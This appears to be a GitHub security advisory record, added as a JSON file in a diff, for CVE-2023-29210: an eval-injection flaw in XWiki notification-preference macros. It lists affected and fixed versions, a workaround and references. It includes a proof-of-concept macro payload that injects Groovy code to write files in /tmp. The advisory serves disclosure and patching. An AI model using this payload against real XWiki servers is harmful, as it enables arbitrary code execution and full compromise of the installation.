@@ -1,0 +1,108 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-p9mj-v5mf-m82x",
+  "modified": "2023-04-16T07:16:09Z",
+  "published": "2023-04-12T20:35:13Z",
+  "aliases": [
+    "CVE-2023-29210"
+  ],
+  "summary": "org.xwiki.platform:xwiki-platform-notifications-ui Eval Injection vulnerability",
+  "details": "### Impact\nAny user with view rights on commonly accessible documents including the notification preferences macros can execute arbitrary Groovy, Python or Velocity code in XWiki leading to full access to the XWiki installation. The root cause is improper escaping of the user parameter of the macro that provide the [notification filters](https://extensions.xwiki.org/xwiki/bin/view/Extension/Notifications%20Application/#HFilters). These macros are used in the user profiles and thus installed by default in XWiki.\n\nA proof of concept exploit is\n\n```\n{{notificationsFiltersPreferences target=\"user\" user=\"~\" /~}~} {{async async=~\"true~\" cached=~\"false~\" context=~\"doc.reference~\"~}~}{{groovy~}~}new File(~\"/tmp/exploit.txt~\").withWriter { out -> out.println(~\"created from filter preferences!~\"); }{{/groovy~}~}{{/async~}~}\"/}}\n\n{{notificationsAutoWatchPreferences target=\"user\" user=\"~\" /~}~} {{async async=~\"true~\" cached=~\"false~\" context=~\"doc.reference~\"~}~}{{groovy~}~}new File(~\"/tmp/exploit2.txt~\").withWriter { out -> out.println(~\"created from auto watch preferences!~\"); }{{/groovy~}~}{{/async~}~}\"/}}\n\n{{notificationsEmailPreferences target=\"user\" user=\"~\" /~}~} {{async async=~\"true~\" cached=~\"false~\" context=~\"doc.reference~\"~}~}{{groovy~}~}new File(~\"/tmp/exploit3.txt~\").withWriter { out -> out.println(~\"created from email filter preferences!~\"); }{{/groovy~}~}{{/async~}~}\"/}}\n```\n\nIf this creates files inside `/tmp`, the installation is vulnerable.\n\n### Patches\nThe vulnerability has been patched in XWiki 13.10.11, 14.4.7 and 14.10.\n\n### Workarounds\nThe issue can be fixed by patching the code in the affected macros that are contained in XWiki documents as shown in the [patch](https://github.com/xwiki/xwiki-platform/commit/cebf9167e4fd64a8777781fc56461e9abbe0b32a) for this issue.\n\n### References\n* https://github.com/xwiki/xwiki-platform/commit/cebf9167e4fd64a8777781fc56461e9abbe0b32a\n* https://jira.xwiki.org/browse/XWIKI-20259\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n* Email us at [Security Mailing List](mailto:security@xwiki.org)\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-notifications-ui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "13.2-rc-1"
+            },
+            {
+              "fixed": "13.10.11"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-notifications-ui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "14.0-rc-1"
+            },
+            {
+              "fixed": "14.4.7"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.xwiki.platform:xwiki-platform-notifications-ui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "14.5"
+            },
+            {
+              "fixed": "14.10"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-p9mj-v5mf-m82x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29210"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/xwiki/xwiki-platform/commit/cebf9167e4fd64a8777781fc56461e9abbe0b32a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/xwiki/xwiki-platform"
+    },
+    {
+      "type": "WEB",
+      "url": "https://jira.xwiki.org/browse/XWIKI-20259"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94",
+      "CWE-95"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-04-12T20:35:13Z",
+    "nvd_published_at": "2023-04-15T17:15:00Z"
+  }
+}
